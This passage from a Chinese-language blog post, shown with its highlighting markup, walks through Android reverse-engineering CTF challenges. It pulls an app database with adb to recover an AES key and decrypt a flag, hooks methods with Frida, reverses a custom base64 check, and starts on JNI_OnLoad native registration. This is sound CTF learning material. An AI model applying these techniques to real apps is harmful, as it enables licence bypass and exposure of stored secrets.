&lt;&lt; <span class="number">4</span>) + Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要是通过encrypt函数进行加密，然后和invalid_license进行比较</p><p>在getconfig中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> AppConfig <span class="title function_">getConfig</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">AppConfig</span> <span class="variable">agency</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AppConfig</span>();</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> <span class="built_in">this</span>.myDataBase.rawQuery(SELECT_QUERY, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">        agency.setId(cursor.getInt(<span class="number">0</span>));</span><br><span class="line">        agency.setName(cursor.getString(<span class="number">1</span>));</span><br><span class="line">        agency.setInstallDate(cursor.getString(<span class="number">2</span>));</span><br><span class="line">        agency.setValidLicence(cursor.getInt(<span class="number">3</span>) &gt; <span class="number">0</span>);</span><br><span class="line">        agency.setSecurityIv(cursor.getString(<span class="number">4</span>));</span><br><span class="line">        agency.setSecurityKey(cursor.getString(<span class="number">5</span>));</span><br><span class="line">        agency.setDesc(cursor.getString(<span class="number">7</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> agency;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现在这里设置了iv和Key</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Context myContext;</span><br><span class="line"><span class="keyword">private</span> SQLiteDatabase myDataBase;</span><br><span class="line"><span class="keyword">private</span> <span class="type">static</span> String DB_PATH = <span class="string">&quot;/data/data/edu.sharif.ctf/databases/&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">static</span> String DB_NAME = <span class="string">&quot;db.db&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">static</span> String TABLE_NAME = <span class="string">&quot;config&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String UPDATE_QUERY = <span class="string">&quot;UPDATE &quot;</span> + TABLE_NAME + <span class="string">&quot; SET d=?&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String SELECT_QUERY = <span class="string">&quot;SELECT  * FROM &quot;</span> + TABLE_NAME + <span class="string">&quot; WHERE a=1&quot;</span>;</span><br></pre></td></tr></table></figure><p>是从数据库中得到的，且有给出路径，那么直接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/data/edu.sharif.ctf/databases/db.db</span><br></pre></td></tr></table></figure><p>获得数据库，然后就能得到iv和Key了</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504141456733.png" alt="image-20250331151635178" style="zoom:50%;" /><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iv=a5efdbd57b84ca36 </span><br><span class="line">key=37eaae0141f1a3adf8a1dee655853714</span><br></pre></td></tr></table></figure><p>因为AES CBC是对称加密的，所以加解密的Key都是一样的</p><p>写个解密AES&#x2F;CBC&#x2F;PKCS5Padding的java类即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String iv=<span class="string">&quot;a5efdbd57b84ca36&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String Key=<span class="string">&quot;37eaae0141f1a3adf8a1dee655853714&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String en_text=<span class="string">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String data=<span class="built_in">decrypt</span>(en_text,Key,iv);</span><br><span class="line">        System.out.<span class="built_in">println</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">decrypt</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> <span class="built_in">SecretKeySpec</span>(<span class="built_in">hexStringToBytes</span>(paramString2), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            Cipher localCipher = Cipher.<span class="built_in">getInstance</span>(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">            localCipher.<span class="built_in">init</span>(Cipher.DECRYPT_MODE, localSecretKeySpec, <span class="keyword">new</span> <span class="built_in">IvParameterSpec</span>(paramString3.<span class="built_in">getBytes</span>()));</span><br><span class="line">            byte[] bytes = localCipher.<span class="built_in">doFinal</span>(<span class="built_in">hexStringToBytes</span>(paramString1));</span><br><span class="line">            String flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">                flag += (<span class="type">char</span>) b;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line">        &#125; <span class="built_in">catch</span> (Exception localException) &#123;</span><br><span class="line">            localException.<span class="built_in">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">bytesToHexString</span><span class="params">(byte[] bytes)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">            sb.<span class="built_in">append</span>(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.<span class="built_in">valueOf</span>(b &amp; <span class="number">255</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> byte[] <span class="built_in">hexStringToBytes</span>(String s) &#123;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">        byte[] data = <span class="keyword">new</span> byte[len / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">            data[i / <span class="number">2</span>] = (byte) ((Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功得到<code>fl-ag-IS-se-ri-al-NU-MB-ER</code></p><h2 id="2015-0CTF-vezel"><a href="#2015-0CTF-vezel" class="headerlink" title="2015-0CTF-vezel"></a>2015-0CTF-vezel</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">confirm</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> getPackageName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">first</span> <span class="operator">=</span> String.valueOf(getSig(s));</span><br><span class="line">    <span class="type">String</span> <span class="variable">next</span> <span class="operator">=</span> getCrc();</span><br><span class="line">    <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;0CTF&#123;&quot;</span> + first + next + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (flag.equals(<span class="built_in">this</span>.et.getText().toString())) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Yes!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;0ops!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要代码如上，发现是通过getSig和getCrc来拼接获得flag的</p><p>那么考虑直接hook getSig和getCrc获得对应的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">MainActivity</span> <span class="operator">=</span> Java.use(<span class="string">&#x27;com.ctf.vezel.MainActivity&#x27;</span>);</span><br><span class="line">    MainActivity.getSig.implementation = function(packageName) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.getSig(packageName);</span><br><span class="line">        console.log(<span class="string">&quot;Signature hashCode: &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    MainActivity.getCrc.implementation = function() &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.getCrc();</span><br><span class="line">        console.log(<span class="string">&quot;Crs: &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Signature hashCode: <span class="number">-183971537</span></span><br><span class="line">Crs: <span class="number">1189242199</span></span><br></pre></td></tr></table></figure><p>得到flag为<code>0CTF&#123;-1839715371189242199&#125;</code></p><h2 id="2017-XMAN-HelloSmali2"><a href="#2017-XMAN-HelloSmali2" class="headerlink" title="2017 XMAN HelloSmali2"></a>2017 XMAN HelloSmali2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hellosmali.hellosmali;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: D:\android_re\CTF\wiki\hello\sec.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Digest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input != <span class="literal">null</span> &amp;&amp; input.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] charinput = input.toCharArray();</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : charinput) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">intinput</span> <span class="operator">=</span> Integer.toBinaryString(c);</span><br><span class="line">                <span class="keyword">while</span> (intinput.length() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                    intinput = <span class="string">&quot;0&quot;</span> + intinput;</span><br><span class="line">                &#125;</span><br><span class="line">                v2.append(intinput);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (v2.length() % <span class="number">6</span> != <span class="number">0</span>) &#123; <span class="comment">// 字符串的长度要是6的倍数</span></span><br><span class="line">                v2.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> String.valueOf(v2);</span><br><span class="line">            <span class="type">char</span>[] v4 = <span class="keyword">new</span> <span class="title class_">char</span>[v1.length() / <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; v4.length; i++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">v6</span> <span class="operator">=</span> Integer.parseInt(v1.substring(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">                v1 = v1.substring(<span class="number">6</span>);</span><br><span class="line">                v4[i] = <span class="string">&quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>.charAt(v6);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(String.valueOf(v4));</span><br><span class="line">            <span class="keyword">if</span> (input.length() % <span class="number">3</span> != <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (input.length() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                    v3.append(<span class="string">&quot;!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v3.append(<span class="string">&quot;!?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> String.valueOf(v3);</span><br><span class="line">            <span class="keyword">if</span> (key.equals(<span class="string">&quot;xsZDluYYreJDyrpDpucZCo!?&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">re1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String key=<span class="string">&quot;xsZDluYYreJDyrpDpucZCo!?&quot;</span>;</span><br><span class="line">        String charset=<span class="string">&quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        key=key.substring(<span class="number">0</span>,key.length()-<span class="number">2</span>);</span><br><span class="line">        System.out.println(key);</span><br><span class="line">        StringBuilder binary_string=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;key.length();i++)&#123;</span><br><span class="line">            <span class="type">char</span> c=key.charAt(i);</span><br><span class="line">            <span class="type">int</span> index=charset.indexOf(c);</span><br><span class="line">            String binary=String.format(<span class="string">&quot;%6s&quot;</span>,Integer.toBinaryString(index)).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            binary_string.append(binary);</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder result=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        String binary=binary_string.toString();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;binary.length();i+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">8</span>&gt;binary.length())&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String byteStr=binary.substring(i,i+<span class="number">8</span>);</span><br><span class="line">            <span class="type">int</span> charCode=Integer.parseInt(byteStr,<span class="number">2</span>);</span><br><span class="line">            result.append((<span class="type">char</span>)charCode);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xsZDluYYreJDyrpDpucZCo</span><br><span class="line">eM_5m4Li_i4_Ea5y</span><br></pre></td></tr></table></figure><p>得到结果</p><h1 id="静态分析原生层"><a href="#静态分析原生层" class="headerlink" title="静态分析原生层"></a>静态分析原生层</h1><h2 id="2015-海峡两岸-一个-APK，逆向试试吧"><a href="#2015-海峡两岸-一个-APK，逆向试试吧" class="headerlink" title="2015 - 海峡两岸 - 一个 APK，逆向试试吧"></a>2015 - 海峡两岸 - 一个 APK，逆向试试吧</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> native boolean <span class="title">testFlag</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> &#123;</span><br><span class="line">    System.<span class="built_in">loadLibrary</span>(<span class="string">&quot;mobicrackNDK&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override <span class="comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">    <span class="built_in">setContentView</span>(R.layout.activity_crack_me);</span><br><span class="line">    <span class="keyword">this</span>.inputButton = (Button) <span class="built_in">findViewById</span>(R.id.input_button);</span><br><span class="line">    <span class="keyword">this</span>.pwdEditText = (EditText) <span class="built_in">findViewById</span>(R.id.pwd);</span><br><span class="line">    <span class="keyword">this</span>.inputButton.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: com.example.mobicrackndk.CrackMe.1</span></span><br><span class="line">        @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View v) &#123;</span><br><span class="line">            CrackMe.<span class="keyword">this</span>.input = CrackMe.<span class="keyword">this</span>.pwdEditText.<span class="built_in">getText</span>().<span class="built_in">toString</span>();</span><br><span class="line">            <span class="keyword">if</span> (CrackMe.<span class="keyword">this</span>.input != null) &#123;</span><br><span class="line">                <span class="keyword">if</span> (CrackMe.<span class="keyword">this</span>.<span class="built_in">testFlag</span>(CrackMe.<span class="keyword">this</span>.input)) &#123;</span><br><span class="line">                    Toast.<span class="built_in">makeText</span>(CrackMe.<span class="keyword">this</span>, CrackMe.<span class="keyword">this</span>.input, <span class="number">1</span>).<span class="built_in">show</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.<span class="built_in">makeText</span>(CrackMe.<span class="keyword">this</span>, <span class="string">&quot;Wrong flag&quot;</span>, <span class="number">1</span>).<span class="built_in">show</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难看出，testFlag就是核心的函数，加载的mobicrackNDK</p><p>但是so文件dump下来直接搜索符号是没有的，因此考虑寻找<code>JNI_Onload</code>函数（通过 <code>JNI_OnLoad</code> 动态注册）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="type">void</span> *reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r1</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+4h] [bp-24h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+Ch] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;JNI_OnLoad&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (*vm)-&gt;<span class="built_in">GetEnv</span>(vm, (<span class="type">void</span> **)&amp;v8, <span class="number">65540</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  v3 = v8;</span><br><span class="line">  v4 = classPathName[<span class="number">0</span>];</span><br><span class="line">  stream = (FILE *)((<span class="type">char</span> *)&amp;_sF + <span class="number">168</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>((FILE *)((<span class="type">char</span> *)&amp;_sF + <span class="number">168</span>), <span class="string">&quot;RegisterNatives start for &#x27;%s&#x27;&quot;</span>, classPathName[<span class="number">0</span>]);</span><br><span class="line">  v5 = (*(<span class="built_in">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">char</span> *))(*(_DWORD *)v3 + <span class="number">24</span>))(v3, v4);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">&quot;Native registration unable to find class &#x27;%s&#x27;&quot;</span>, v4);</span><br><span class="line">LABEL_6:</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;GetEnv failed&quot;</span>, (FILE *)((<span class="type">char</span> *)&amp;_sF + <span class="number">168</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (*(<span class="built_in">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">char</span> **, <span class="type">int</span>))(*(_DWORD *)v3 + <span class="number">860</span>))(v3, v5, off_400C, <span class="number">2</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">&quot;RegisterNatives failed for &#x27;%s&#x27;&quot;</span>, v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">65540</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(<span class="built_in">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">char</span> **, <span class="type">int</span>))(*(_DWORD *)v3 + <span class="number">860</span>))(v3, v5, off_400C, <span class="number">2</span>) &lt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>这就是注册的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000400</span>C off_400C        DCD aTestflag           ; DATA XREF: JNI_OnLoad+<span class="number">60</span>↑o</span><br><span class="line">.data:<span class="number">0000400</span>C                                         ; JNI_OnLoad+<span class="number">68</span>↑o ...</span><br><span class="line">.data:<span class="number">0000400</span>C                                         ; <span class="string">&quot;testFlag&quot;</span></span><br><span class="line">.data:<span class="number">00004010</span>                 DCD aLjavaLangStrin_0   ; <span class="string">&quot;(Ljava/lang/String;)Z&quot;</span></span><br><span class="line">.data:<span class="number">00004014</span>                 DCD abcdefghijklmn+<span class="number">1</span></span><br><span class="line">.data:<span class="number">00004018</span>                 DCD aHello              ; <span class="string">&quot;hello&quot;</span></span><br><span class="line">.data:<span 